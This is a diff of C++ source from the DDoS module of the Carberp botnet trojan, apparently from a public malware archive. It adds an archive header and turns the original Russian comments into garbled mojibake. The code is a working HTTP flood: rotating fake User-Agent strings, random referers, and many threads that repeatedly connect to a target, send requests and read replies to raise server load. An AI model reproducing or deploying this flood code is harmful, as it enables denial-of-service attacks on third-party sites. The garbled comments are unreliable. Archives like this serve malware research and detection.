@@ -1,9 +1,20 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include "Utils.h"
 #include "DDOSClasses.h"
 
 
-//  Массив User-Agent
+//  пїЅпїЅпїЅпїЅпїЅпїЅ User-Agent
 const static PCHAR UserAgents[] = {
 		"Mozilla/1.1 (compatible; MSPIE 2.0; Windows CE)",
 		"Mozilla/1.10 [en] (Compatible; RISC OS 3.70; Oregano 1.10)",
@@ -138,7 +149,7 @@ const static PCHAR UserAgents[] = {
 		"Opera/9.80 (X11; Linux x86_64; U; ru) Presto/2.2.15 Version/10.10",
 		NULL};
 
-// Массив доменных зон
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		const static PCHAR Domains[] = {"com", "biz", "in", "inf", "ru", "ua", "net", "en", 
 										"ed", "an", "ar", "au", "at", "il", "nf", "tr", "uk", 
 										NULL};
@@ -164,7 +175,7 @@ TDDOS::~TDDOS()
 
 PCHAR TDDOS::GetRandomString(const PCHAR* StrArray, DWORD &ArraySize)
 {
-	// Функция возвращает случайный элемент массива строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!ArraySize)
 		while (StrArray[ArraySize]) ArraySize++;
 	if (!ArraySize) 
@@ -180,7 +191,7 @@ BOOL TDDOS::Execute(bool Wait)
 
 	FTerminated = false;
 
-	// Инициализируем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	FRequest.CloseConnection = true;
 	FRequest.SetURL(URL.t_str());
 	if (FRequest.Host.IsEmpty())
@@ -191,16 +202,16 @@ BOOL TDDOS::Execute(bool Wait)
 
 	FSendData = FRequest.MakeRequestHeaders();
 
-	// Инициализируем библиотеку сокетов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!InitializeWSA()) return false;
 
-	// Получаем  адрес по имени хоста
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FHostAddres = (LPHOSTENT)pgethostbyname(FRequest.Host.t_str());
 
 	if ( FHostAddres == NULL )
 		return false;
 
-	// Запускаем потоки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 0; i < MaxThreads; i++)
 	{
 		if (StartThread(DDOSThreadProc, this))
@@ -230,7 +241,7 @@ void TDDOS::Terminate()
 
 
 
-// Функция выполнения многократного подключения к испытуемому сайту
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
 {
 	
@@ -241,21 +252,21 @@ DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
 
 	while (!DDOS->FTerminated)
 	{
-		// Создаём сокет
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);
 
 		if(Socket != SOCKET_ERROR)
 		{
-			// Подключаемся к серверу
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			struct sockaddr_in SockAddr;
 			SockAddr.sin_family		 = AF_INET;
 			SockAddr.sin_addr.s_addr = **(unsigned long**)DDOS->FHostAddres->h_addr_list;
 			SockAddr.sin_port		 = HTONS((unsigned short)DDOS->FRequest.Port);
 
-			// подключаемся к сокету
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if ( (int)pconnect(Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
 			{
-				// Генерируем данные
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				PCHAR UserAgent = DDOS->GetRandomString(UserAgents, DDOS->FUserAgentsCount);
 				string RefererHost = Random::RandomString2(Random::Generate(5, 10), 'a', 'z');
 
@@ -265,7 +276,7 @@ DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
 
 				int Sended = (int)psend(Socket, Buf.AsStr(), Size, 0);
 
-				// Для увеличения нагрузки на сервер пытаемся получить от сервера ответ
+				// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				if (Sended == Size)
 				{
 					Size = (int)precv(Socket, Buf.Buf(), 1024, 0);
@@ -276,7 +287,7 @@ DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
 			pclosesocket(Socket);
 		}
 
-		// Ждём до следующей отправки
+		// пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!DDOS->FTerminated)
 			pSleep(SleepInterval);
     }
@@ -290,7 +301,7 @@ DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
 
 int  TDDOS::MakeString(PCHAR Buf, PCHAR FormatLine, ...)
 {
-		// Функция собирает строку запроса
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	va_list paramList;
 	va_start(paramList, FormatLine);
 
